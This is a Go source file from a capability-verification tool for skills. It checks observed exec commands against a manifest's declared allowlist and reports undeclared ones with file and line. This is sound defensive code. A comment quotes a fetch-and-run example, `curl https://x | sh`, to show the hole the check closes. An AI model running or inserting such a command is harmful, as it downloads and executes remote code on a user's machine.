package verify

import (
	"github.com/SuperMarioYL/skillprov/internal/manifest"
	"github.com/SuperMarioYL/skillprov/internal/scan"
)

// checkExecAllowlist enforces the declared exec COMMAND allowlist at value
// granularity — the last class-level capability hole, closed in v0.3.
//
// Through v0.2, exec was reduced to a single boolean: a skill that declared
// exec:[git] could quietly run `curl https://x | sh` and still verify green,
// because the coarse exec class was declared. This mirrors the host/env holes
// closed in v0.2 (see hostdiff.go). As of v0.3, when the manifest declares a
// finite command allowlist (no "*" wildcard), every observed command must appear
// in it; any residual command is itself an undeclared capability and rejects the
// skill, naming the exact command and its file:line.
//
// A wildcard "*" command keeps the permissive path for skills that intentionally
// declared open exec — there is nothing to diff against.
func checkExecAllowlist(m *manifest.CapabilityManifest, res *scan.Result, v *Verdict) {
	allow := m.Capabilities.Exec
	// No finite allowlist to enforce: exec undeclared, or a wildcard.
	if len(allow) == 0 || hasWildcard(allow) {
		return
	}

	allowed := map[string]bool{}
	for _, c := range allow {
		allowed[normalizeAllowCommand(c)] = true
	}
	seen := map[string]bool{}
	for _, hit := range res.ObservedExecHits() {
		cmd := hit.Command
		if cmd == "" || allowed[cmd] || seen[cmd] {
			continue
		}
		// Report only the first sighting of each off-allowlist command.
		seen[cmd] = true
		v.UndeclaredExec = append(v.UndeclaredExec, scan.ExecHit{
			Command: cmd, File: hit.File, Line: hit.Line,
		})
	}
}

// normalizeAllowCommand reduces a declared command entry to the same bare
// program-name form the scanner records observed commands in, so the diff
// compares like with like. Declaring "/usr/bin/git" or "git" both match an
// observed "git"; an argument tail ("git push") is reduced to its leading token.
func normalizeAllowCommand(c string) string {
	// Reuse the scanner's normalization so declared and observed tokens line up.
	return scan.NormalizeCommandName(c)
}
